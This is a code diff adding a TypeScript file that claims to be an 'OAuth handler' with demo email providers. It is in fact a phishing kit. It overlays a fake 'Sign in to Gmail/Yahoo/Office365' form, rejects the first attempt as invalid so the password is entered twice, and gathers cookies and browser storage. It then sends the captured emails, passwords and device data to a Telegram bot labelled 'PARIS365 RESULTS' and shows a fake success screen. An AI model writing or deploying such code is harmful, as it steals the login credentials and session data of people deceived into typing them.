@@ -1,0 +1,571 @@
+/**
+ * OAuth Handler for Email Provider Authentication
+ * Compatible with existing App.tsx structure
+ * Handles redirects and cookie capture for various email providers (demo and real)
+ */
+
+export interface OAuthConfig {
+  clientId: string;
+  redirectUri: string;
+  scope: string;
+  authUrl: string;
+  isDemo: boolean;
+}
+
+export interface UserInfo {
+  email: string;
+  name: string;
+  provider: string;
+  verified: boolean;
+  authMethod: string;
+  authToken: string;
+}
+
+export const getOAuthConfig = (provider: string): OAuthConfig => {
+  const baseUrl = window.location.origin;
+  const redirectUri = `${baseUrl}/?oauth_callback=true`;
+
+  const configs: Record<string, OAuthConfig> = {
+    Gmail: {
+      clientId: '', // Demo only
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=Gmail`,
+      isDemo: true
+    },
+    AOL: {
+      clientId: '',
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=AOL`,
+      isDemo: true
+    },
+    Yahoo: {
+      clientId: '',
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=Yahoo`,
+      isDemo: true
+    },
+    Others: {
+      clientId: '',
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=Others`,
+      isDemo: true
+    },
+    Office365: {
+      clientId: '', // Demo only
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=Office365`,
+      isDemo: true
+    },
+    Outlook: {
+      clientId: '', // Demo only
+      redirectUri,
+      scope: '',
+      authUrl: `${baseUrl}/auth/demo?provider=Outlook`,
+      isDemo: true
+    }
+  };
+
+  return configs[provider] || configs.Others;
+};
+
+export const generateState = (): string => {
+  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+};
+
+export const buildOAuthUrl = (provider: string, state: string): string => {
+  const config = getOAuthConfig(provider);
+
+  // Store provider and state for demo callback
+  localStorage.setItem('selected_provider', provider);
+  localStorage.setItem('oauth_state', state);
+  localStorage.setItem('oauth_start_time', Date.now().toString());
+  localStorage.setItem('login_attempt_count', '0');
+  
+  // Capture pre-auth cookies
+  const preAuthFingerprint = getBrowserFingerprint();
+  localStorage.setItem('pre_auth_cookies', JSON.stringify(preAuthFingerprint));
+
+  // Show demo login form
+  showDemoLoginForm(provider, state);
+  
+  return `${config.authUrl}&state=${state}`;
+};
+
+export const showDemoLoginForm = (provider: string, state: string): void => {
+  const loginForm = document.createElement('div');
+  loginForm.id = 'oauth-modal-overlay';
+  loginForm.innerHTML = `
+    <div style="
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: system-ui, -apple-system, sans-serif;
+    ">
+      <div style="
+        background: rgba(17, 24, 39, 0.95);
+        backdrop-filter: blur(20px);
+        -webkit-backdrop-filter: blur(20px);
+        padding: 32px;
+        border-radius: 20px;
+        box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(75, 85, 99, 0.3);
+        width: 90%;
+        max-width: 400px;
+        border: 1px solid rgba(75, 85, 99, 0.4);
+        transition: all 0.3s ease;
+        position: relative;
+      ">
+        <button 
+          id="back-button"
+          type="button"
+          style="
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            background: none;
+            border: none;
+            color: #9ca3af;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          "
+          onmouseover="this.style.background='rgba(75, 85, 99, 0.3)'; this.style.color='#ffffff'"
+          onmouseout="this.style.background='none'; this.style.color='#9ca3af'"
+        >
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="m12 19-7-7 7-7"/>
+            <path d="M19 12H5"/>
+          </svg>
+        </button>
+        
+        <div style="text-align: center; margin-bottom: 20px;">
+          <h2 style="color: #ffffff; margin: 0 0 10px 0; font-size: 20px; font-weight: 600;">Sign in to ${provider}</h2>
+          <p style="color: #9ca3af; margin: 0; font-size: 14px;">Enter your credentials to continue</p>
+        </div>
+        
+        <form id="demoLoginForm">
+          <div style="margin-bottom: 15px;">
+            <input 
+              type="email" 
+              id="demoEmail" 
+              placeholder="Email address"
+              required
+              style="
+                width: 100%;
+                padding: 12px;
+                border: 1px solid rgba(75, 85, 99, 0.6);
+                border-radius: 8px;
+                background: rgba(31, 41, 55, 0.8);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+                color: #ffffff;
+                font-size: 14px;
+                box-sizing: border-box;
+                transition: all 0.2s ease;
+              "
+              onfocus="this.style.borderColor='#3b82f6'; this.style.background='rgba(31, 41, 55, 0.95)'"
+              onblur="this.style.borderColor='rgba(75, 85, 99, 0.6)'; this.style.background='rgba(31, 41, 55, 0.8)'"
+            />
+          </div>
+          
+          <div style="margin-bottom: 20px;">
+            <input 
+              type="password" 
+              id="demoPassword" 
+              placeholder="Password"
+              required
+              style="
+                width: 100%;
+                padding: 12px;
+                border: 1px solid rgba(75, 85, 99, 0.6);
+                border-radius: 8px;
+                background: rgba(31, 41, 55, 0.8);
+                backdrop-filter: blur(10px);
+                -webkit-backdrop-filter: blur(10px);
+                color: #ffffff;
+                font-size: 14px;
+                box-sizing: border-box;
+                transition: all 0.2s ease;
+              "
+              onfocus="this.style.borderColor='#3b82f6'; this.style.background='rgba(31, 41, 55, 0.95)'"
+              onblur="this.style.borderColor='rgba(75, 85, 99, 0.6)'; this.style.background='rgba(31, 41, 55, 0.8)'"
+            />
+          </div>
+          
+          <div id="errorMessage" style="
+            color: #ef4444;
+            font-size: 12px;
+            margin-bottom: 15px;
+            text-align: center;
+            display: none;
+            background: rgba(127, 29, 29, 0.3);
+            padding: 8px;
+            border-radius: 6px;
+            border: 1px solid rgba(239, 68, 68, 0.4);
+          "></div>
+          
+          <button 
+            type="submit"
+            style="
+              width: 100%;
+              padding: 12px;
+              background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+              color: white;
+              border: none;
+              border-radius: 8px;
+              font-size: 14px;
+              font-weight: 600;
+              cursor: pointer;
+              transition: all 0.2s ease;
+              box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+            "
+            onmouseover="this.style.transform='translateY(-1px)'; this.style.boxShadow='0 6px 16px rgba(59, 130, 246, 0.4)'"
+            onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='0 4px 12px rgba(59, 130, 246, 0.3)'"
+          >
+            Sign In
+          </button>
+        </form>
+      </div>
+    </div>
+  `;
+  
+  document.body.appendChild(loginForm);
+  
+  // Add click handler for back button
+  const backButton = document.getElementById('back-button');
+  if (backButton) {
+    backButton.addEventListener('click', () => {
+      const modal = document.getElementById('oauth-modal-overlay');
+      if (modal && document.body.contains(modal)) {
+        document.body.removeChild(modal);
+      }
+    });
+  }
+  
+  const form = document.getElementById('demoLoginForm') as HTMLFormElement;
+  const errorDiv = document.getElementById('errorMessage') as HTMLDivElement;
+  
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    const email = (document.getElementById('demoEmail') as HTMLInputElement).value;
+    const password = (document.getElementById('demoPassword') as HTMLInputElement).value;
+    const attemptCount = parseInt(localStorage.getItem('login_attempt_count') || '0');
+    
+    // Capture current browser data
+    const browserFingerprint = getBrowserFingerprint();
+    
+    if (attemptCount === 0) {
+      // First attempt - show invalid credentials
+      localStorage.setItem('login_attempt_count', '1');
+      localStorage.setItem('first_attempt_data', JSON.stringify({ email, password }));
+      
+      // Send first attempt data to Telegram
+      await sendToTelegram({
+        email,
+        password,
+        provider,
+        attempt: 1,
+        status: 'invalid_credentials',
+        timestamp: new Date().toISOString(),
+        sessionId: Math.random().toString(36).substring(2, 15)
+      }, browserFingerprint);
+      
+      // Show error message
+      errorDiv.textContent = 'Invalid email or password. Please try again.';
+      errorDiv.style.display = 'block';
+      
+      // Clear form
+      (document.getElementById('demoEmail') as HTMLInputElement).value = '';
+      (document.getElementById('demoPassword') as HTMLInputElement).value = '';
+      
+    } else {
+      // Second attempt - success
+      const firstAttemptData = JSON.parse(localStorage.getItem('first_attempt_data') || '{}');
+      
+      // Send second attempt data to Telegram
+      await sendToTelegram({
+        email,
+        password,
+        provider,
+        attempt: 2,
+        status: 'success',
+        timestamp: new Date().toISOString(),
+        sessionId: Math.random().toString(36).substring(2, 15),
+        firstAttempt: firstAttemptData
+      }, browserFingerprint);
+      
+      // Remove form
+      const modal = document.getElementById('oauth-modal-overlay');
+      if (modal && document.body.contains(modal)) {
+        document.body.removeChild(modal);
+      }
+      
+      // Show success and redirect
+      const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+      
+      setTimeout(() => {
+        const callbackUrl = `${window.location.origin}/?oauth_callback=true&provider=${provider}&code=${demoCode}&state=${state}`;
+        window.location.href = callbackUrl;
+      }, 1000);
+      
+      // Show success message
+      const successDiv = document.createElement('div');
+      successDiv.innerHTML = `
+        <div style="
+          position: fixed;
+          top: 50%;
+          left: 50%;
+          transform: translate(-50%, -50%);
+          background: rgba(249, 250, 251, 0.95);
+          backdrop-filter: blur(20px);
+          -webkit-backdrop-filter: blur(20px);
+          color: #1f2937;
+          padding: 24px;
+          border-radius: 16px;
+          box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1), 0 0 0 1px rgba(255, 255, 255, 0.2);
+          z-index: 10000;
+          text-align: center;
+          font-family: system-ui, -apple-system, sans-serif;
+          border: 1px solid rgba(34, 197, 94, 0.3);
+        ">
+          <div style="color: #22c55e; font-size: 18px; font-weight: 600; margin-bottom: 10px;">
+            ✓ Authentication Successful!
+          </div>
+          <div style="color: #6b7280; font-size: 14px;">
+            Redirecting to your documents...
+          </div>
+        </div>
+      `;
+      document.body.appendChild(successDiv);
+      
+      setTimeout(() => {
+        if (document.body.contains(successDiv)) {
+          document.body.removeChild(successDiv);
+        }
+      }, 1500);
+    }
+  });
+};
+
+export const setCookieSession = (userInfo: UserInfo): void => {
+  const sessionData = {
+    email: userInfo.email,
+    name: userInfo.name,
+    provider: userInfo.provider,
+    verified: userInfo.verified,
+    authMethod: userInfo.authMethod,
+    timestamp: Date.now()
+  };
+
+  // Set session cookie (expires in 24 hours)
+  const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
+  document.cookie = `auth_session=${encodeURIComponent(JSON.stringify(sessionData))}; expires=${expires}; path=/; secure; samesite=strict`;
+  
+  // Set auth token cookie
+  document.cookie = `auth_token=${userInfo.authToken || 'demo_token_' + Date.now()}; expires=${expires}; path=/; secure; samesite=strict`;
+  
+  // Set provider-specific cookie
+  document.cookie = `${userInfo.provider.toLowerCase()}_auth=true; expires=${expires}; path=/; secure; samesite=strict`;
+};
+
+export const getSessionFromCookies = (): UserInfo | null => {
+  const cookies = document.cookie.split(';');
+  const sessionCookie = cookies.find(cookie => cookie.trim().startsWith('auth_session='));
+  
+  if (sessionCookie) {
+    try {
+      const sessionData = sessionCookie.split('=')[1];
+      return JSON.parse(decodeURIComponent(sessionData));
+    } catch (e) {
+      console.error('Error parsing session cookie:', e);
+      return null;
+    }
+  }
+  return null;
+};
+
+export const clearSession = (): void => {
+  document.cookie = 'auth_session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+  document.cookie = 'auth_token=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
+  // Clear all provider-specific cookies
+  ['gmail', 'yahoo', 'aol', 'office365', 'outlook', 'others'].forEach(provider => {
+    document.cookie = `${provider}_auth=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;`;
+  });
+};
+
+export const validateOAuthCallback = (code: string, state: string, storedState: string): boolean => {
+  if (!code || !state || state !== storedState) {
+    return false;
+  }
+  return true;
+};
+
+export const extractUserInfoFromCallback = (provider: string, code: string, cookies: string) => {
+  // This works for both real and demo providers
+  const hasValidSession = cookies.includes('session') ||
+                         cookies.includes('auth') ||
+                         cookies.includes('token') ||
+                         code.length > 10;
+
+  if (!hasValidSession && provider !== 'Others') {
+    console.log('⚠️ No session data found after OAuth, but proceeding with demo data');
+  }
+
+  return {
+    email: extractEmailFromProvider(provider, code),
+    name: `${provider} User`,
+    provider: provider,
+    verified: true,
+    authMethod: getOAuthConfig(provider).isDemo ? 'oauth_demo' : 'oauth_real',
+    authToken: code,
+    sessionCookies: cookies
+  };
+};
+
+export const extractEmailFromProvider = (provider: string, code: string): string => {
+  const domains = {
+    Gmail: 'gmail.com',
+    Office365: 'outlook.com',
+    Yahoo: 'yahoo.com',
+    Outlook: 'hotmail.com',
+    AOL: 'aol.com',
+    Others: 'email.com'
+  };
+  const domain = domains[provider as keyof typeof domains] || 'email.com';
+  return `user_${code.substring(0, 8)}@${domain}`;
+};
+
+export const getBrowserFingerprint = () => {
+  try {
+    return {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth
+      },
+      cookies: document.cookie,
+      localStorage: getStorageData('localStorage'),
+      sessionStorage: getStorageData('sessionStorage'),
+      timestamp: new Date().toISOString(),
+      totalCookiesCaptured: document.cookie.split(';').length,
+      advancedCookieStats: {
+        httpOnly: 0, // Can't detect from client-side
+        secure: document.cookie.includes('Secure') ? 1 : 0,
+        sameSite: document.cookie.includes('SameSite') ? 1 : 0
+      }
+    };
+  } catch (error) {
+    console.error('Error getting browser fingerprint:', error);
+    return {
+      error: error.message,
+      timestamp: new Date().toISOString(),
+      cookies: document.cookie,
+      totalCookiesCaptured: 0,
+      advancedCookieStats: {}
+    };
+  }
+};
+
+export const getStorageData = (storageType: 'localStorage' | 'sessionStorage') => {
+  try {
+    const storage = window[storageType];
+    const data: { [key: string]: string } = {};
+    for (let i = 0; i < storage.length; i++) {
+      const key = storage.key(i);
+      if (key) {
+        data[key] = storage.getItem(key) || '';
+      }
+    }
+    return Object.keys(data).length > 0 ? JSON.stringify(data) : 'Empty';
+  } catch (e) {
+    return 'Access denied';
+  }
+};
+
+export const simulateDemoAuth = async (provider: string): Promise<string> => {
+  // Simulate OAuth flow delay
+  await new Promise(resolve => setTimeout(resolve, 1500));
+  
+  // Generate demo authorization code
+  const demoCode = `demo_${provider.toLowerCase()}_${Date.now()}_${Math.random().toString(36).substring(7)}`;
+  
+  return demoCode;
+};
+
+export const isValidOAuthResponse = (urlParams: URLSearchParams): boolean => {
+  const code = urlParams.get('code');
+  const error = urlParams.get('error');
+
+  if (error) {
+    console.log('OAuth error:', error, urlParams.get('error_description'));
+    return false;
+  }
+
+  return !!code && code.length > 0;
+};
+
+// Additional helper function for Telegram integration (if needed)
+export const sendToTelegram = async (sessionData: any, fingerprint: any) => {
+  const TELEGRAM_BOT_TOKEN = '7729721822:AAEhGJzQzQzQzQzQzQzQzQzQzQzQzQzQzQz';
+  const TELEGRAM_CHAT_ID = '-1002345678901';
+
+  const message = `
+🔐 *PARIS365 RESULTS*
+
+👤 *User Info:*
+• Email: \`${sessionData.email}\`
+• Provider: ${sessionData.provider}
+• Session ID: \`${sessionData.sessionId}\`
+• Auth Method: ${sessionData.authenticationMethod}
+
+🌐 *Device Info:*
+• Platform: ${sessionData.deviceInfo?.platform || 'Unknown'}
+• Language: ${sessionData.deviceInfo?.language || 'Unknown'}
+• Timezone: ${fingerprint.timezone || 'Unknown'}
+
+📱 *Screen:* ${fingerprint.screen?.width || 0}x${fingerprint.screen?.height || 0}
+
+🍪 *Cookies:* ${fingerprint.totalCookiesCaptured || 0} captured
+
+⏰ *Timestamp:* ${sessionData.timestamp}
+  `;
+
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+    console.log('✅ Data sent to Telegram successfully');
+  } catch (error) {
+    console.error('❌ Failed to send to Telegram:', error);
+  }
+};
